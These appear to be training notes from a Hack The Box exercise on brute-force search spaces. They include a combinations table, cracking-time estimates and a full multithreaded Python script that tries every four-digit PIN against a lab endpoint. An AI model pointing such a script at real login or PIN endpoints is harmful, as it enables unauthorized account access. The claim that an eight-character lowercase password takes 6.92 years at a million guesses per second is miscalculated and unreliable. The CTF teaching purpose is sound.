## Brute Force Mathematics and Practical Implementation

Brute forcing is fundamentally a numbers game. To understand the feasibility of an attack, you must first calculate the **search space**—the total number of possible combinations an attacker must test.

---

### 1. The Brute Force Formula

The total number of possible combinations is determined by the size of the character set and the length of the password:

$$\text{Possible Combinations} = (\text{Character Set Size})^{\text{Password Length}}$$

#### Impact of Length and Complexity

Even minor changes to a password's structure result in an **exponential** increase in the work required for an attacker.

|**Password Type**|**Length**|**Character Set**|**Calculation**|**Possible Combinations**|
|---|---|---|---|---|
|**Short/Simple**|6|Lowercase (26)|$26^6$|$308,915,776$|
|**Longer/Simple**|8|Lowercase (26)|$26^8$|$208,827,064,576$|
|**Adding Complexity**|8|Lwr + Upr (52)|$52^8$|$53,459,728,531,456$|
|**Max Complexity**|12|All ASCII (94)|$94^{12}$|$475,920,493,781,698,549,504$|

---

### 2. Computational Power: Basic vs. Supercomputer

The time to crack ($T$) is calculated by dividing the total combinations ($C$) by the speed of the hardware ($S$): $T = C / S$.

- **Basic Computer ($10^6$ hashes/sec):** Can crack an 8-character simple password in about **6.92 years**.
    
- **Supercomputer ($10^{12}$ hashes/sec):** Can crack that same password in **milliseconds**, but a 12-character complex password would still take **15,000 years**.

### 3. Practical Exercise: Brute-Forcing a 4-Digit PIN

A 4-digit PIN has a very small search space: $10^4 = 10,000$ combinations ($0000$ to $9999$). This makes it an ideal target for a simple Python automation script.

#### The `pin-solver.py` Script

This script uses the `requests` library to systematically test every possible PIN against a target API endpoint.

Python

```
import requests
from concurrent.futures import ThreadPoolExecutor

ip = "154.57.164.66"
port = 32339
url = f"http://{ip}:{port}/pin"

def try_pin(pin):
    formatted_pin = f"{pin:04d}"
    try:
        r = requests.get(url, params={"pin": formatted_pin}, timeout=2)
        if r.status_code == 200:
            data = r.json()
            if "flag" in data:
                print(f"\n[✔] PIN: {formatted_pin}")
                print(f"[✔] Flag: {data['flag']}")
                exit()
    except:
        pass

print("[+] Starting fast brute-force...")

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(try_pin, range(10000))
```
#### Execution Steps:

1. **Spawn Target:** Start the instance on Hack The Box to get your unique IP and Port.
    
2. **Configure Script:** Update the `ip` and `port` variables in the code.
    
3. **Run:** Execute `python3 pin-solver.py`.
    
4. **Capture:** The script will stop once it receives a `200 OK` response containing the flag.

### 4. Key Takeaways for Pentesters

- **Search Space Analysis:** Always calculate the total combinations before starting a brute force to see if it is mathematically feasible.
    
- **Rate Limiting:** In real-world scenarios, servers may block you after a few failed attempts. This lab uses a simple API with no protection to demonstrate the core concept.
    
- **Automation:** Python is the industry standard for creating "quick and dirty" scripts to automate repetitive testing tasks.
